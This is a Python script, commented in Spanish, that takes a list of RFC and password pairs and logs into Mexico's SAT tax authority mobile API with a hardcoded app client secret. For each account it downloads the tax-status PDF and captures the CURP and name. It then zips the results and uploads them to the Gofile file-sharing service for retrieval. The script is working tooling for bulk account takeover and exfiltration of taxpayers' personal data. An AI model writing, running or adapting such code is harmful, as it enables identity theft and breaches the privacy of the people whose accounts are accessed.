import requests
import base64
import os
import zipfile
import re

# Datos de la App SAT Móvil
CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def limpiar_texto(texto):
    # Elimina caracteres invisibles como el BOM que causa los '??'
    return re.sub(r'[^\x20-\x7E]', '', texto).strip()

def run():
    if not os.path.exists("usuarios.txt"):
        print("? Archivo usuarios.txt no encontrado.")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    reporte_txt = "=== REPORTE DE CAPTURAS SAT ===\n\n"
    
    with open("usuarios.txt", "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.readlines()

    session = requests.Session()

    for linea in lineas:
        linea = linea.strip()
        if not linea or ":" not in linea:
            continue
        
        partes = linea.split(":", 1)
        rfc = limpiar_texto(partes[0]).upper()
        pwd = partes[1].strip()

        if len(rfc) < 12: continue

        print(f"?? Procesando: {rfc}")

        # 1. OBTENER TOKEN (POST con Form Data)
        token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
        
        # IMPORTANTE: Estos datos deben ir en el body (data), no en params
        payload = {
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "username": rfc,
            "password": pwd,
            "scope": "satmovil",
            "resourceServer": "satmovil"
        }
        
        headers_auth = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        
        try:
            # Enviamos como data=payload para que sea application/x-www-form-urlencoded
            r_auth = session.post(token_url, data=payload, headers=headers_auth, timeout=20)
            
            if r_auth.status_code != 200:
                print(f"  [!] Error {r_auth.status_code}: {r_auth.text}")
                continue
                
            data_token = r_auth.json()
            token = data_token.get("access_token")
            
            if not token:
                print(f"  [!] No se recibió token para {rfc}")
                continue

            headers_api = {
                "Authorization": f"bearer {token}",
                "User-Agent": "Dart/3.5 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=UTF-8"
            }

            # 2. DESCARGAR PDF
            pdf_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}"
            r_pdf = session.get(pdf_url, headers=headers_api, timeout=20)
            
            if r_pdf.status_code == 200:
                pdf_b64 = r_pdf.json().get("constancia")
                if pdf_b64:
                    with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                        f_pdf.write(base64.b64decode(pdf_b64))
                    print(f"  [+] PDF obtenido")

            # 3. CAPTURAR DATOS
            info_url = f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}"
            r_info = session.get(info_url, headers=headers_api, timeout=20)
            
            if r_info.status_code == 200:
                info = r_info.json()
                reporte_txt += f"RFC: {rfc} | CURP: {info.get('curp')} | NOMBRE: {info.get('tradename')}\n"
                print(f"  [+] Datos capturados")

        except Exception as e:
            print(f"  [!] Error en {rfc}: {str(e)}")

    # 4. COMPRIMIR Y SUBIR
    archivos_descargados = os.listdir("PDFS_SAT")
    if archivos_descargados:
        with open("CAPTURAS.txt", "w", encoding="utf-8") as f_cap:
            f_cap.write(reporte_txt)

        with zipfile.ZipFile("RESULTADOS_SAT.zip", 'w') as zipf:
            zipf.write("CAPTURAS.txt")
            for file in archivos_descargados:
                zipf.write(f"PDFS_SAT/{file}", file)

        print("\n?? Subiendo a Gofile...")
        try:
            server_data = requests.get("https://api.gofile.io/servers").json()
            server = server_data["data"]["servers"][0]["name"]
            with open("RESULTADOS_SAT.zip", "rb") as f_zip:
                up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
            print(f"\n? ENLACE FINAL: {up['data']['downloadPage']}")
        except:
            print("? Error en subida.")
    else:
        print("? No se descargó nada. Revisa tus credenciales.")

if __name__ == "__main__":
    run()
